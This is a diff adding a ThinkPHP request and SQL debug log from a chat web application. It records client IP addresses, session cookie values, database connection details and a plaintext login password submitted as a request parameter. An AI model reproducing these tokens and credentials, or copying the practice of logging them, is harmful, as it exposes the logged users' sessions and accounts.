+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'client_id' => '7f0000010fa000000014',
+  'client_name' => 'admin',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->bind[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000977s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.005824s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000699s ]
+[ sql ] [ SQL ] SELECT `avatar`,`user_login` FROM `edd_users` WHERE  `user_login` = 'admin' [ RunTime:0.000557s ]
+---------------------------------------------------------------
+[ 2017-07-30T23:32:25+08:00 ] 0.0.0.0 139.205.180.214 POST /home/chat/send_message.html
+[ info ] eddchat.oumaikeji.com/home/chat/send_message.html [运行时间：0.075423s][吞吐率：13.26req/s] [内存消耗：3,434.30kb] [文件加载：62]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'send_message',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '140',
+  'x-original-url' => '/home/chat/send_message.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'UID=19vLz; PHPSESSID=us37334guq2l1gqrqfcuib2ip5; CUID=9gDIW',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'self_name' => 'admin',
+  'msg' => '大家好，我这儿有很多php源码',
+  'type' => 'all',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->send_message[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.006071s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006270s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000702s ]
+[ sql ] [ SQL ] SELECT `avatar`,`id` FROM `edd_users` WHERE  `user_login` = 'admin' [ RunTime:0.000542s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_mess` [ RunTime:0.005780s ]
+[ sql ] [ SQL ] INSERT INTO `edd_mess` (`mess_date` , `from_client_id` , `to_client_id` , `content`) VALUES ('1501428745' , 1 , 0 , '大家好，我这儿有很多php源码') [ RunTime:0.000558s ]
+---------------------------------------------------------------
+[ 2017-07-30T23:54:11+08:00 ] 0.0.0.0 221.218.192.103 GET /
+[ info ] eddchat.oumaikeji.com/ [运行时间：0.047900s][吞吐率：20.88req/s] [内存消耗：2,495.11kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36',
+  'referer' => 'http://www.topthink.com/topic/26211.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'accept-language' => 'zh-CN,zh-TW;q=0.8,zh;q=0.6',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T23:54:14+08:00 ] 0.0.0.0 221.218.192.103 GET /favicon.ico
+[ info ] eddchat.oumaikeji.com/favicon.ico [运行时间：0.032722s][吞吐率：30.56req/s] [内存消耗：1,854.89kb] [文件加载：41]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'favicon.ico',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/favicon.ico',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=rq8uhbo9b7868gecqq7fnjsvj5',
+  'accept-language' => 'zh-CN,zh-TW;q=0.8,zh;q=0.6',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept' => 'image/webp,image/*,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T23:54:21+08:00 ] 0.0.0.0 221.218.192.103 POST /home/login/login_think.html
+[ info ] eddchat.oumaikeji.com/home/login/login_think.html [运行时间：0.094615s][吞吐率：10.57req/s] [内存消耗：3,428.55kb] [文件加载：63]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'login',
+    2 => 'login_think',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '37',
+  'x-original-url' => '/home/login/login_think.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=rq8uhbo9b7868gecqq7fnjsvj5',
+  'accept-language' => 'zh-CN,zh-TW;q=0.8,zh;q=0.6',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'client123',
+  'password' => 'client123',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->login_think[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.002287s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006075s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `user_login` = 'client123' LIMIT 1 [ RunTime:0.000742s ]
+[ error ] [2]MemcachePool::get(): Invalid key[C:\web\eddchat_wrkb2y\web\thinkphp\library\think\cache\driver\Memcache.php:66]
+---------------------------------------------------------------
+[ 2017-07-30T23:54:46+08:00 ] 0.0.0.0 221.218.192.103 POST /home/login/login_think.html
+[ info ] eddchat.oumaikeji.com/home/login/login_think.html [运行时间：0.077016s][吞吐率：12.98req/s] [内存消耗：3,428.44kb] [文件加载：63]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'login',
+    2 => 'login_think',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '37',
+  'x-original-url' => '/home/login/login_think.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=rq8uhbo9b7868gecqq7fnjsvj5',
+  'accept-language' => 'zh-CN,zh-TW;q=0.8,zh;q=0.6',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'client123',
+  'password' => 'client123',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->login_think[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.014253s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006336s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `user_login` = 'client123' LIMIT 1 [ RunTime:0.000724s ]
+[ error ] [2]MemcachePool::get(): Invalid key[C:\web\eddchat_wrkb2y\web\thinkphp\library\think\cache\driver\Memcache.php:66]
+---------------------------------------------------------------
+[ 2017-07-30T23:54:49+08:00 ] 0.0.0.0 221.218.192.103 GET /
+[ info ] eddchat.oumaikeji.com/ [运行时间：0.040183s][吞吐率：24.89req/s] [内存消耗：2,495.68kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36',
+  'referer' => 'http://www.topthink.com/topic/26211.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=rq8uhbo9b7868gecqq7fnjsvj5',
+  'accept-language' => 'zh-CN,zh-TW;q=0.8,zh;q=0.6',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'cache-control' => 'max-age=0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T23:54:55+08:00 ] 0.0.0.0 221.218.192.103 POST /home/login/login_think.html
+[ info ] eddchat.oumaikeji.com/home/login/login_think.html [运行时间：0.077051s][吞吐率：12.98req/s] [内存消耗：3,428.44kb] [文件加载：63]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'login',
+    2 => 'login_think',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '37',
+  'x-original-url' => '/home/login/login_think.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=rq8uhbo9b7868gecqq7fnjsvj5',
+  'accept-language' => 'zh-CN,zh-TW;q=0.8,zh;q=0.6',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'client123',
+  'password' => 'client123',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->login_think[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.014030s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006187s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `user_login` = 'client123' LIMIT 1 [ RunTime:0.000729s ]
+[ error ] [2]MemcachePool::get(): Invalid key[C:\web\eddchat_wrkb2y\web\thinkphp\library\think\cache\driver\Memcache.php:66]
